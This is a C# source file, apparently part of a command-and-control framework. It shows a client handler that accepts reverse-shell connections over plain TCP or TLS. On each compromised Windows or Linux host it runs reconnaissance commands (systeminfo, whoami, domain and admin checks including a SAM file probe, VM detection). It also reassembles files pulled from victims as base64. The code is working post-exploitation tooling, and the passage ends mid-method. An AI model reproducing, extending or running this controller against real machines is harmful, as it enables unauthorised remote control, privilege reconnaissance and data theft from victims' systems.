using C2Framework;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;

public class PrependedNetworkStream : Stream
{
    private readonly Stream _baseStream;
    private readonly byte[] _prependedData;
    private int _prependedPosition = 0;
    private bool _prependedDataConsumed = false;

    public PrependedNetworkStream(Stream baseStream, byte[] prependedData)
    {
        _baseStream = baseStream ?? throw new ArgumentNullException(nameof(baseStream));
        _prependedData = prependedData ?? throw new ArgumentNullException(nameof(prependedData));
    }

    public override int Read(byte[] buffer, int offset, int count)
    {
        int totalRead = 0;

        if (!_prependedDataConsumed && _prependedPosition < _prependedData.Length)
        {
            int prependedAvailable = _prependedData.Length - _prependedPosition;
            int prependedToRead = Math.Min(count, prependedAvailable);

            Array.Copy(_prependedData, _prependedPosition, buffer, offset, prependedToRead);
            _prependedPosition += prependedToRead;
            totalRead += prependedToRead;
            offset += prependedToRead;
            count -= prependedToRead;

            // Mark as consumed if we've read all prepended data
            if (_prependedPosition >= _prependedData.Length)
            {
                _prependedDataConsumed = true;
            }
        }

        if (count > 0)
        {
            int baseRead = _baseStream.Read(buffer, offset, count);
            totalRead += baseRead;
        }

        return totalRead;
    }

    public override async Task<int> ReadAsync(byte[] buffer, int offset, int count, CancellationToken cancellationToken)
    {
        int totalRead = 0;

        if (!_prependedDataConsumed && _prependedPosition < _prependedData.Length)
        {
            int prependedAvailable = _prependedData.Length - _prependedPosition;
            int prependedToRead = Math.Min(count, prependedAvailable);

            Array.Copy(_prependedData, _prependedPosition, buffer, offset, prependedToRead);
            _prependedPosition += prependedToRead;
            totalRead += prependedToRead;
            offset += prependedToRead;
            count -= prependedToRead;

            // Mark as consumed if we've read all prepended data
            if (_prependedPosition >= _prependedData.Length)
            {
                _prependedDataConsumed = true;
            }
        }

        if (count > 0)
        {
            int baseRead = await _baseStream.ReadAsync(buffer, offset, count, cancellationToken);
            totalRead += baseRead;
        }

        return totalRead;
    }

    // Delegate write operations to base stream
    public override void Write(byte[] buffer, int offset, int count) => _baseStream.Write(buffer, offset, count);
    public override async Task WriteAsync(byte[] buffer, int offset, int count, CancellationToken cancellationToken) =>
        await _baseStream.WriteAsync(buffer, offset, count, cancellationToken);
    public override void Flush() => _baseStream.Flush();
    public override async Task FlushAsync(CancellationToken cancellationToken) =>
        await _baseStream.FlushAsync(cancellationToken);

    // Delegate other operations to base stream
    public override long Seek(long offset, SeekOrigin origin) => _baseStream.Seek(offset, origin);
    public override void SetLength(long value) => _baseStream.SetLength(value);
    public override bool CanRead => _baseStream.CanRead;
    public override bool CanSeek => _baseStream.CanSeek;
    public override bool CanWrite => _baseStream.CanWrite;
    public override long Length => _baseStream.Length;
    public override long Position
    {
        get => _baseStream.Position;
        set => _baseStream.Position = value;
    }
    public override int ReadTimeout
    {
        get => _baseStream.ReadTimeout;
        set => _baseStream.ReadTimeout = value;
    }
    public override int WriteTimeout
    {
        get => _baseStream.WriteTimeout;
        set => _baseStream.WriteTimeout = value;
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing)
        {
            _baseStream?.Dispose();
        }
        base.Dispose(disposing);
    }
}
public class ClientHandler
{
    public string ID { get; set; }
    public string Hostname { get; set; }
    public string IP { get; set; }
    public string TlsProtocol { get; private set; }
    public string CipherAlgorithm { get; private set; }
    public int CipherStrength { get; private set; }
    private string _lastResponse = string.Empty;
    private bool _showProgressMessages = true;
    private SslStream _sslStream;
    private X509Certificate2 _serverCertificate;
    private Stream _baseStream;
    private TcpClient _client;
    private string _clientId;
    private string _clientInfo;
    private bool _isConnected;
    private readonly object _lockObject = new object();
    private string _userName;
    private string _computerName;
    private string _osVersion;
    private bool _isAdmin;
    private DateTime _lastSeen;
    private DateTime _lastProgressUpdate = DateTime.MinValue;
    private int _lastReportedSize = 0;
    private bool _filterCliXml = false;
    private bool _captureBase64 = false;
    private StringBuilder _base64Builder = new StringBuilder();

    private string _lastSentCommand = string.Empty;
    private bool _isLinux = false;
    private string _shellType = "unknown";
    private bool _systemInfoGathered = false;
    private TaskCompletionSource<bool> _systemInfoComplete = new TaskCompletionSource<bool>();
    private bool _allowGuiUpdates = false;
    public bool IsLinux => _isLinux;
    private DateTime _lastMessageTime = DateTime.MinValue;
    private int _messageCount = 0;
    private int _base64MessageCount = 0; // Separate counter for base64 data
    private const int MaxCommandMessagesPerMinute = 100; // For regular commands
    private const int MaxBase64MessagesPerMinute = 5000; // For file transfers
    private bool _downloadInProgress = false;
    public string ShellType => _shellType;
    public string EncryptionStatus => _isEncrypted ? "🔒 TLS" : "🔓 Plain";

    private Stream _activeStream; // Will point to either _sslStream or _baseStream
    private bool _isEncrypted = false; // Track if connection is encrypted

    public bool IsEncrypted => _isEncrypted;
    // Events
    public event EventHandler<OutputMessageEventArgs> ResponseReceived;
    public event EventHandler StatusChanged;

    public string ClientId => _clientId;
    public string ClientInfo => _clientInfo;
    public bool IsConnected => _isConnected;
    public string UserName => _userName;
    public string ComputerName => _computerName;
    public string OSVersion => _osVersion;
    public bool IsAdmin => _isAdmin;
    public DateTime LastSeen => _lastSeen;
    private const int MaxMessagesPerMinute = 100;
    private string _domainName = "Unknown";
    private bool _isDomainJoined = false;
    public bool IsDomainJoined => _isDomainJoined;


    public ClientHandler(TcpClient client, string clientId, string clientInfo, X509Certificate2 certificate = null)
    {
        _client = client;
        _clientId = clientId;
        _clientInfo = clientInfo;
        _baseStream = client.GetStream();
        _serverCertificate = certificate;
        _isConnected = true;
        _lastSeen = DateTime.Now;
        _filterCliXml = true;
        _userName = "Unknown";
        _computerName = "Unknown";
        _osVersion = "Unknown";
        _isAdmin = false;
    }
    public void SetCliXmlFiltering(bool enabled)
    {
        _filterCliXml = enabled;
    }
    public void EnableBase64Capture(bool enable, bool showProgressMessages = true)
    {
        _captureBase64 = enable;
        _showProgressMessages = showProgressMessages;

        if (enable)
        {
            _base64Builder.Clear();
            _lastReportedSize = 0;
        }
    }

    private async Task DetectDomainMembership()
    {
        try
        {
            RaiseResponseReceived($"[*] Detecting domain membership...", Color.Cyan);

            if (_shellType == "powershell")
            {
                await SendCommandAndWait("$env:USERDOMAIN", 2000);
            }
            else
            {
                await SendCommandAndWait("echo %USERDOMAIN%", 2000);
            }
            string userDomainResponse = await ReadResponseWithTimeout(3000);



            if (!string.IsNullOrEmpty(userDomainResponse))
            {


            }
            else
            {
            }
        }
        catch (Exception ex)
        {
        }
    }



    private async Task<bool> DetectTlsHandshakeAsync()
    {
        try
        {
            var originalTimeout = _baseStream.ReadTimeout;
            _baseStream.ReadTimeout = 3000; // 3 seconds

            byte[] buffer = new byte[1];
            var readTask = _baseStream.ReadAsync(buffer, 0, 1);

            if (await Task.WhenAny(readTask, Task.Delay(3000)) == readTask)
            {
                int bytesRead = await readTask;
                if (bytesRead > 0)
                {
                    // Check if first byte looks like TLS handshake (0x16)
                    bool isTls = buffer[0] == 0x16;

                    // Put the byte back by creating a new stream with it prepended
                    var prependedData = new byte[1] { buffer[0] };
                    _baseStream = new PrependedNetworkStream(_baseStream, prependedData);

                    _baseStream.ReadTimeout = originalTimeout;
                    return isTls;
                }
            }

            _baseStream.ReadTimeout = originalTimeout;
            return false;
        }
        catch (Exception)
        {
            return false;
        }
    }
    private bool CheckRateLimit()
    {
        var now = DateTime.Now;

        // Reset counters every minute
        if ((now - _lastMessageTime).TotalMinutes >= 1)
        {
            _messageCount = 0;
            _base64MessageCount = 0;
            _lastMessageTime = now;
        }

        // Much higher limits for file transfers
        if (_captureBase64 || _downloadInProgress)
        {
            _base64MessageCount++;
            return _base64MessageCount <= 500000;
        }
        else
        {
            _messageCount++;
            return _messageCount <= MaxCommandMessagesPerMinute;
        }
    }



    public string GetCapturedBase64()
    {
        if (_base64Builder.Length == 0)
            return string.Empty;

        string rawData = _base64Builder.ToString();

        try
        {
            // Look for clearly marked start and end
            int startIndex = rawData.IndexOf("BEGIN_BASE64_DATA");
            int endIndex = rawData.IndexOf("END_BASE64_DATA");

            if (startIndex >= 0 && endIndex > startIndex)
            {
                // Move past the newline after BEGIN
                startIndex = rawData.IndexOf('\n', startIndex);
                if (startIndex >= 0)
                {
                    startIndex += 1; // Skip the newline

                    int length = Math.Min(endIndex - startIndex, rawData.Length - startIndex);
                    string base64Content = rawData.Substring(startIndex, length).Trim();
                    return base64Content;
                }
            }

            // If no markers or malformed, fall back to filtering logic
            var lines = rawData.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

            // Filter out noise: echoes, status messages, shell output
            var base64Lines = lines
                .Where(line =>
                    Regex.IsMatch(line.Trim(), @"^[A-Za-z0-9\+/=]{20,}$") &&  // Only valid base64
                    !line.Contains("echo") &&
                    !line.Contains("TEMP_FILE_VERIFIED") &&
                    !line.Contains("UPLOAD_SUCCESS") &&
                    !line.Contains("UPLOAD_FAILED") &&
                    !line.Contains("ERROR:") &&
                    !line.Contains("DEL ") &&
                    !line.Contains("FILE_SIZE:") &&
                    !line.Contains("TRANSFER_COMPLETE") &&
                    !line.StartsWith("[") &&
                    !line.StartsWith("#<") &&
                    !line.Contains("<Objs") &&
                    !line.Contains("powershell") &&
                    line.Length > 20
                )
                .ToList();

            return string.Join("", base64Lines);
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error extracting base64: {ex.Message}", Color.Red);
            return string.Empty;
        }
    }



    private bool IsValidBase64String(string s)
    {
        // Check if string is null or empty
        if (string.IsNullOrEmpty(s))
            return false;


        int validChars = 0;
        int totalChars = 0;

        foreach (char c in s)
        {
            if (char.IsWhiteSpace(c) || c == '\r' || c == '\n')
                continue;

            totalChars++;

            if ((c >= 'A' && c <= 'Z') ||
                (c >= 'a' && c <= 'z') ||
                (c >= '0' && c <= '9') ||
                c == '+' || c == '/' || c == '=')
            {
                validChars++;
            }
        }

        // If the string is at least 90% valid base64 characters and has some meaningful length, consider it valid
        return totalChars > 10 && (double)validChars / totalChars >= 0.9;
    }

    public async void HandleClient()
    {
        try
        {
            // Set longer timeouts for stability
            if (_client != null && _client.Client != null)
            {
                _client.ReceiveTimeout = 60000; // 60 seconds
                _client.SendTimeout = 30000; // 30 seconds
                _client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
            }

            // Detect if this is a TLS connection
            bool isTlsHandshake = await DetectTlsHandshakeAsync();

            if (isTlsHandshake && _serverCertificate != null)
            {
                // Set up TLS connection
                _sslStream = new SslStream(_baseStream, false);

                try
                {
                    await _sslStream.AuthenticateAsServerAsync(
                        _serverCertificate,
                        clientCertificateRequired: false,
                        enabledSslProtocols: SslProtocols.Tls12 | SslProtocols.Tls13,
                        checkCertificateRevocation: false);

                    // Verify cipher strength
                    if (_sslStream.CipherStrength < 128)
                    {
                        RaiseResponseReceived($"[!] Weak cipher detected: {_sslStream.CipherStrength} bits", Color.Red);
                        Disconnect();
                        return;
                    }

                    // Log enhanced security info
                    RaiseResponseReceived($"[+] Secure TLS {_sslStream.SslProtocol} connection established", Color.Green);
                    RaiseResponseReceived($"[+] Cipher: {_sslStream.CipherAlgorithm} ({_sslStream.CipherStrength} bits)", Color.Green);
                    RaiseResponseReceived($"[+] Hash: {_sslStream.HashAlgorithm} ({_sslStream.HashStrength} bits)", Color.Green);

                    _activeStream = _sslStream;
                    _isEncrypted = true;

                    TlsProtocol = _sslStream.SslProtocol.ToString();
                    CipherAlgorithm = _sslStream.CipherAlgorithm.ToString();
                    CipherStrength = _sslStream.CipherStrength;

                    RaiseResponseReceived($"[+] Secure TLS {TlsProtocol} connection established with {_clientInfo} using {CipherAlgorithm}", Color.Green);
                }
                catch (Exception ex)
                {
                    RaiseResponseReceived($"[!] SSL authentication failed: {ex.Message}", Color.Red);
                    Disconnect();
                    return;
                }
            }
            else
            {
                // Use plain text connection
                _activeStream = _baseStream;
                _isEncrypted = false;
                RaiseResponseReceived($"[+] Plain text connection established with {_clientInfo}", Color.Yellow);

                // For plain text connections, gather system info immediately
                await GatherInitialSystemInfo();
            }

            byte[] buffer = new byte[65536];
            StringBuilder messageAccumulator = new StringBuilder();

            while (_isConnected)
            {
                int bytesRead = 0;

                try
                {
                    var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
                    bytesRead = await _activeStream.ReadAsync(buffer, 0, buffer.Length, cts.Token);
                }
                catch (OperationCanceledException)
                {
                    continue;
                }
                catch (IOException ioEx)
                {
                    if (_isConnected)
                    {

                        if (ioEx.InnerException is SocketException sockEx)
                        {
                            if (sockEx.SocketErrorCode == SocketError.TimedOut)
                            {
                                // Just a timeout, continue
                                continue;
                            }
                        }
                        RaiseResponseReceived($"[!] Connection lost: {ClientId}", Color.Red);
                    }
                    break;
                }
                catch (Exception ex)
                {
                    if (_isConnected)
                    {
                        RaiseResponseReceived($"[!] Connection error: {ClientId}", Color.Red);
                    }
                    break;
                }

                if (bytesRead <= 0)
                {
                    // Connection closed
                    break;
                }

                string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);



                if (string.IsNullOrEmpty(message))
                {
                    continue;
                }

                if (_isEncrypted)
                {
                    message = DeobfuscateCommand(message);

                    // Validate timestamp for replay protection
                    if (message.Contains("|") && message.Split('|').Length >= 2)
                    {
                        var parts = message.Split('|', 2);
                        if (DateTime.TryParse(parts[0], out DateTime messageTime))
                        {
                            // Check if message is too old (prevent replay attacks)
                            if (Math.Abs((DateTime.UtcNow - messageTime).TotalMinutes) > 5)
                            {
                                RaiseResponseReceived("[!] Message timestamp too old - possible replay attack", Color.Red);
                                continue;
                            }
                            message = parts[1]; // Extract actual message
                        }
                    }
                }

                // Rate limiting check
                if (!CheckRateLimit())
                {
                    continue;
                }

                bool isCliXml = message.Contains("#< CLIXML") ||
                                message.Contains("<Objs Version=") ||
                                message.Contains("xmlns=\"http://schemas.microsoft.com/powershell/");

                if (_filterCliXml && isCliXml)
                {
                    continue;
                }

                _lastSeen = DateTime.Now;

                if (_allowGuiUpdates || !_systemInfoGathered)
                {
                    ParseSystemInfo(message);
                }

                RaiseStatusChanged();

                _lastResponse = message;

                if (_captureBase64)
                {
                    if (IsValidBase64String(message))
                    {
                        _base64Builder.Append(message);

                        if (_showProgressMessages)
                        {
                            int currentSizeKB = _base64Builder.Length / 1024;
                            if (currentSizeKB - _lastReportedSize >= 100 || _lastReportedSize == 0)
                            {
                                _lastReportedSize = currentSizeKB;
                                RaiseResponseReceived($"[*] Downloading... {currentSizeKB} KB", Color.Cyan);
                            }
                        }
                    }
                    else
                    {
                        string cleanMessage = CleanShellPrompt(message);
                        RaiseResponseReceived(cleanMessage, Color.Green);
                    }
                }
                else
                {
                    string cleanMessage = CleanShellPromptPreserveContent(message);
                    RaiseResponseReceived(cleanMessage, Color.Green);
                }
            }
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error handling client: {ex.Message}", Color.Red);
        }
        finally
        {
            Disconnect();
        }
    }
    private string CleanShellPromptPreserveContent(string message)
    {
        // Remove ANSI escape sequences for cleaner logging
        string cleaned = Regex.Replace(message, @"\x1B\[[0-9;]*[mGKH]", "");

        // Remove the ]0; terminal title sequences
        cleaned = Regex.Replace(cleaned, @"\]0;[^\a]*\a", "");


        return cleaned;
    }

    private async Task GatherInitialSystemInfo()
    {
        try
        {
            await Task.Delay(2000); // Let connection stabilize

            // First detect OS more reliably
            string osType = await DetectOSType();

            if (osType == "windows")
            {
                _isLinux = false;
                await GatherWindowsInfo();
            }
            else if (osType == "linux")
            {
                _isLinux = true;
                await GatherLinuxInfo();
            }
            else
            {
                // Default to Windows if unclear
                _isLinux = false;
                _shellType = "cmd";
                await GatherWindowsInfo();
            }

            _systemInfoGathered = true;
            _systemInfoComplete.SetResult(true);
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error gathering initial system info: {ex.Message}", Color.Red);
            _systemInfoComplete.SetResult(false);
        }
    }
    private async Task<string> DetectOSType()
    {
        try
        {
            // Set a reasonable timeout
            _activeStream.ReadTimeout = 5000;

            // Try a simple echo command first to see what we get back
            await SendCommandAndWait("echo OSTEST", 2000);
            string initialResponse = await ReadResponseWithTimeout(3000);

            if (!string.IsNullOrEmpty(initialResponse))
            {
                // Check for Windows-specific patterns
                if (initialResponse.Contains("C:\\") ||
                    initialResponse.Contains("PS ") ||
                    initialResponse.Contains("Microsoft Windows"))
                {
                    _shellType = initialResponse.Contains("PS ") ? "powershell" : "cmd";
                    return "windows";
                }

                // Check for Linux patterns
                if (initialResponse.Contains("$") ||
                    initialResponse.Contains("bash") ||
                    initialResponse.Contains("@") ||
                    !initialResponse.Contains("\\"))
                {
                    _shellType = "sh";
                    return "linux";
                }
            }

            // If echo test is inconclusive, try OS-specific commands
            await SendCommandAndWait("ver", 1500);
            string verResponse = await ReadResponseWithTimeout(2000);

            if (!string.IsNullOrEmpty(verResponse) && verResponse.Contains("Microsoft Windows"))
            {
                _shellType = "cmd";
                return "windows";
            }

            // Try uname for Linux
            await SendCommandAndWait("uname", 1500);
            string unameResponse = await ReadResponseWithTimeout(2000);

            if (!string.IsNullOrEmpty(unameResponse) && unameResponse.Contains("Linux"))
            {
                _shellType = "sh";
                return "linux";
            }

            // Default to Windows
            return "windows";
        }
        catch
        {
            return "windows";
        }
        finally
        {
            _activeStream.ReadTimeout = Timeout.Infinite;
        }
    }


    private async Task GatherWindowsInfo()
    {
        try
        {
            RaiseResponseReceived($"[+] Windows {_shellType} client detected", Color.Green);
            RaiseResponseReceived($"[*] Gathering comprehensive Windows system information...", Color.Cyan);
            _allowGuiUpdates = true;

            // Use systeminfo for comprehensive system information
            await SendCommandAndWait("systeminfo", 5000); // Give more time for systeminfo
            string systeminfoResponse = await ReadResponseWithTimeout(8000); // Longer timeout

            if (!string.IsNullOrEmpty(systeminfoResponse))
            {
                await ParseSystemInfoOutput(systeminfoResponse); // Now properly awaited
            }
            else
            {

                // Fallback to individual commands if systeminfo fails
                await GatherWindowsInfoFallback();
            }

            RaiseStatusChanged();
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error gathering Windows info: {ex.Message}", Color.Red);
            // Try fallback method
            await GatherWindowsInfoFallback();
        }
        finally
        {
            _allowGuiUpdates = false;
        }
    }
    private async Task ParseSystemInfoOutput(string systeminfoOutput)
    {
        if (string.IsNullOrEmpty(systeminfoOutput))
            return;

        try
        {
            var lines = systeminfoOutput.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            bool infoUpdated = false;

            foreach (var line in lines)
            {
                var trimmedLine = line.Trim();

                // Skip command echo and empty lines
                if (trimmedLine == "systeminfo" || string.IsNullOrEmpty(trimmedLine))
                    continue;

                // Parse Host Name
                if (trimmedLine.StartsWith("Host Name:", StringComparison.OrdinalIgnoreCase))
                {
                    string hostName = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(hostName) && _computerName != hostName.ToUpper())
                    {
                        _computerName = hostName.ToUpper();
                        RaiseResponseReceived($"[*] Hostname: {_computerName}", Color.Cyan);
                        infoUpdated = true;
                    }
                }
                // Parse OS Name - USE THIS DIRECTLY, NO CONVERSION
                else if (trimmedLine.StartsWith("OS Name:", StringComparison.OrdinalIgnoreCase))
                {
                    string osName = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(osName))
                    {
                        // Use the exact OS name from systeminfo - much more accurate
                        _osVersion = CleanOSName(osName);
                        RaiseResponseReceived($"[*] OS: {_osVersion}", Color.Cyan);
                        infoUpdated = true;
                    }
                }
                // Parse OS Version (Build number) - just for additional info
                else if (trimmedLine.StartsWith("OS Version:", StringComparison.OrdinalIgnoreCase))
                {
                    string osVersion = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(osVersion))
                    {
                        string buildInfo = ExtractBuildNumber(osVersion);
                        if (!string.IsNullOrEmpty(buildInfo))
                        {
                            RaiseResponseReceived($"[*] Build: {buildInfo}", Color.Cyan);
                            // Optionally append build info to OS version
                            _osVersion = $"{_osVersion} (Build {buildInfo})";
                            infoUpdated = true;
                        }
                    }
                }
                // Parse System Type (architecture)
                else if (trimmedLine.StartsWith("System Type:", StringComparison.OrdinalIgnoreCase))
                {
                    string systemType = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(systemType))
                    {
                        RaiseResponseReceived($"[*] Architecture: {systemType}", Color.Cyan);
                    }
                }
                // Parse Total Physical Memory
                else if (trimmedLine.StartsWith("Total Physical Memory:", StringComparison.OrdinalIgnoreCase))
                {
                    string memory = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(memory))
                    {
                        RaiseResponseReceived($"[*] Total RAM: {memory}", Color.Cyan);
                    }
                }
                // Detect VM environment
                else if (trimmedLine.StartsWith("System Manufacturer:", StringComparison.OrdinalIgnoreCase))
                {
                    string manufacturer = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(manufacturer))
                    {
                        if (manufacturer.ToLower().Contains("vmware"))
                        {
                            RaiseResponseReceived($"[*] VM Environment: VMware", Color.Yellow);
                        }
                        else if (manufacturer.ToLower().Contains("virtualbox"))
                        {
                            RaiseResponseReceived($"[*] VM Environment: VirtualBox", Color.Yellow);
                        }
                        else if (manufacturer.ToLower().Contains("microsoft") && manufacturer.ToLower().Contains("virtual"))
                        {
                            RaiseResponseReceived($"[*] VM Environment: Hyper-V", Color.Yellow);
                        }
                        else if (manufacturer.ToLower().Contains("qemu"))
                        {
                            RaiseResponseReceived($"[*] VM Environment: QEMU/KVM", Color.Yellow);
                        }
                    }
                }
                // Parse Domain information
                else if (trimmedLine.StartsWith("Domain:", StringComparison.OrdinalIgnoreCase))
                {
                    string domain = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(domain))
                    {
                        _domainName = domain.Trim();

                        if (_domainName.Equals(_computerName, StringComparison.OrdinalIgnoreCase) ||
                            _domainName.Equals("WORKGROUP", StringComparison.OrdinalIgnoreCase))
                        {
                            _isDomainJoined = false;
                            RaiseResponseReceived($"[*] 🏠 WORKGROUP: {domain}", Color.Yellow);
                        }
                        else
                        {
                            _isDomainJoined = true;
                            RaiseResponseReceived($"[*] 🌐 DOMAIN JOINED: {domain}", Color.Green);
                        }

                        RaiseResponseReceived($"[*] Domain/Workgroup: {domain}", Color.Cyan);
                        infoUpdated = true;
                    }
                }
                // Network information
                else if (trimmedLine.StartsWith("Network Card(s):", StringComparison.OrdinalIgnoreCase))
                {
                    string nicCount = ExtractValueAfterColon(trimmedLine);
                    if (!string.IsNullOrEmpty(nicCount))
                    {
                        RaiseResponseReceived($"[*] Network Cards: {nicCount}", Color.Cyan);
                    }
                }
            }

            // Now get current user info since systeminfo doesn't provide current user
            await GetCurrentUserInfo();

            if (infoUpdated)
            {
                RaiseStatusChanged();
            }
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error parsing systeminfo output: {ex.Message}", Color.Red);
        }
    }

    private string CleanOSName(string osName)
    {
        if (string.IsNullOrEmpty(osName))
            return "Unknown";

        // Just clean up extra whitespace and remove "Microsoft" prefix if desired
        string cleaned = osName.Trim();

        if (cleaned.StartsWith("Microsoft ", StringComparison.OrdinalIgnoreCase))
        {
            cleaned = cleaned.Substring(10).Trim();
        }

        return cleaned;
    }
    private async Task GetCurrentUserInfo()
    {
        try
        {
            RaiseResponseReceived($"[DEBUG] GetCurrentUserInfo started", Color.Gray);

            // First detect domain membership
            await DetectDomainMembership();

            // Then get user info
            await SendCommandAndWait("whoami", 2000);
            string whoamiResponse = await ReadResponseWithTimeout(3000);

            if (!string.IsNullOrEmpty(whoamiResponse))
            {
                ParseWindowsUsername(whoamiResponse);
            }

            await CheckWindowsAdminPrivileges();
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error getting user info: {ex.Message}", Color.Red);
        }
    }

    private async Task CheckWindowsAdminPrivileges()
    {
        try
        {
            if (_shellType == "powershell")
            {
                // PowerShell method
                string adminCheck = "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)";
                await SendCommandAndWait(adminCheck, 2000);
                string adminResponse = await ReadResponseWithTimeout(3000);

                if (!string.IsNullOrEmpty(adminResponse))
                {
                    ParseWindowsAdminStatus(adminResponse);
                }
            }
            else
            {
                await SendCommandAndWait("net session >nul 2>&1 && echo ADMIN || echo USER", 2000);
                string netResponse = await ReadResponseWithTimeout(3000);

                if (!string.IsNullOrEmpty(netResponse))
                {
                    ParseWindowsAdminStatus(netResponse);
                }
                else
                {
                    await SendCommandAndWait("dir C:\\Windows\\System32\\config\\SAM >nul 2>&1 && echo ADMIN || echo USER", 2000);
                    string dirResponse = await ReadResponseWithTimeout(3000);

                    if (!string.IsNullOrEmpty(dirResponse))
                    {
                        ParseWindowsAdminStatus(dirResponse);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error checking admin privileges: {ex.Message}", Color.Red);
        }
    }
    private string ExtractValueAfterColon(string line)
    {
        int colonIndex = line.IndexOf(':');
        if (colonIndex >= 0 && colonIndex < line.Length - 1)
        {
            return line.Substring(colonIndex + 1).Trim();
        }
        return string.Empty;
    }


    private string ExtractBuildNumber(string osVersionLine)
    {
        var buildMatch = Regex.Match(osVersionLine, @"Build (\d+)", RegexOptions.IgnoreCase);
        if (buildMatch.Success)
        {
            return buildMatch.Groups[1].Value;
        }

        var versionMatch = Regex.Match(osVersionLine, @"(\d+\.\d+\.\d+)");
        if (versionMatch.Success)
        {
            return versionMatch.Groups[1].Value;
        }

        return string.Empty;
    }


    private async Task GatherWindowsInfoFallback()
    {
        try
        {
            RaiseResponseReceived($"[*] Using fallback method for system information...", Color.Yellow);

            // Get username
            await SendCommandAndWait("whoami", 2000);
            string whoamiResponse = await ReadResponseWithTimeout(3000);
            if (!string.IsNullOrEmpty(whoamiResponse))
            {
                ParseWindowsUsername(whoamiResponse);
            }

            // Get hostname
            await SendCommandAndWait("hostname", 1500);
            string hostnameResponse = await ReadResponseWithTimeout(2000);
            if (!string.IsNullOrEmpty(hostnameResponse))
            {
                ParseWindowsHostname(hostnameResponse);
            }

            // Get OS version using ver command
            await SendCommandAndWait("ver", 2000);
            string verResponse = await ReadResponseWithTimeout(3000);
            if (!string.IsNullOrEmpty(verResponse))
            {
                ParseWindowsVersion(verResponse);
            }

            // Check admin privileges
            await CheckWindowsAdminPrivileges();
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error in fallback method: {ex.Message}", Color.Red);
        }
    }

    private async Task SendCommandAndWait(string command, int waitMs)
    {
        try
        {
            byte[] commandBytes = Encoding.UTF8.GetBytes(command + "\n");
            await _activeStream.WriteAsync(commandBytes, 0, commandBytes.Length);
            await _activeStream.FlushAsync();
            await Task.Delay(waitMs);
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error sending command: {ex.Message}", Color.Red);
        }
    }

    private async Task<string> ReadResponseWithTimeout(int timeoutMs)
    {
        try
        {
            using (var cts = new CancellationTokenSource(timeoutMs))
            {
                byte[] buffer = new byte[4096];
                var readTask = _activeStream.ReadAsync(buffer, 0, buffer.Length, cts.Token);

                int bytesRead = await readTask;
                if (bytesRead > 0)
                {
                    return Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                }
            }
        }
        catch (OperationCanceledException)
        {
            // Timeout occurred
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error reading response: {ex.Message}", Color.Red);
        }

        return string.Empty;
    }

    private async Task GatherLinuxInfo()
    {
        try
        {
            // Enable updates for initial gathering
            _allowGuiUpdates = true;

            RaiseResponseReceived($"[+] Linux shell client detected", Color.Green);
            RaiseResponseReceived($"[*] Gathering Linux system information...", Color.Cyan);

            // Get username with better parsing
            await SendCommandAndWait("whoami", 1500);
            string whoamiResponse = await ReadResponseWithTimeout(2000);
            if (!string.IsNullOrEmpty(whoamiResponse))
            {
                ParseLinuxUsername(whoamiResponse);
            }

            // Get hostname
            await SendCommandAndWait("hostname", 1500);
            string hostnameResponse = await ReadResponseWithTimeout(2000);
            if (!string.IsNullOrEmpty(hostnameResponse))
            {
                ParseLinuxHostname(hostnameResponse);
            }

            // Get OS info with multiple attempts
            await SendCommandAndWait("uname -r", 2000);
            string unameResponse = await ReadResponseWithTimeout(3000);
            if (!string.IsNullOrEmpty(unameResponse))
            {
                ParseLinuxVersion(unameResponse);
            }

            // Check if root
            await SendCommandAndWait("id -u", 1500);
            string idResponse = await ReadResponseWithTimeout(2000);
            if (!string.IsNullOrEmpty(idResponse))
            {
                ParseLinuxPrivileges(idResponse);
            }

            // Try to get distribution info
            await SendCommandAndWait("cat /etc/os-release | head -1", 2000);
            string distroResponse = await ReadResponseWithTimeout(3000);
            if (!string.IsNullOrEmpty(distroResponse))
            {
                ParseLinuxDistro(distroResponse);
            }

            RaiseStatusChanged();
        }
        catch (Exception ex)
        {
            RaiseResponseReceived($"[!] Error gathering Linux info: {ex.Message}", Color.Red);
        }
        finally
        {
            // Disable updates after initial gathering
            _allowGuiUpdates = false;
        }
    }



    private void ParseWindowsUsername(string response)
    {
        if (string.IsNullOrEmpty(response)) return;

        var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            // Skip command echoes and prompts
            if (trimmed == "whoami" || trimmed.StartsWith("PS ") || trimmed.Contains("C:\\") || trimmed.Length == 0)
                continue;

            // Look for domain\user format
            if (trimmed.Contains("\\"))
            {
                var parts = trimmed.Split('\\');
                if (parts.Length == 2)
                {
                    if (parts[0].Equals("NT AUTHORITY", StringComparison.OrdinalIgnoreCase))
                    {
                        _userName = "NT AUTHORITY\\SYSTEM";
                        _isAdmin = true;
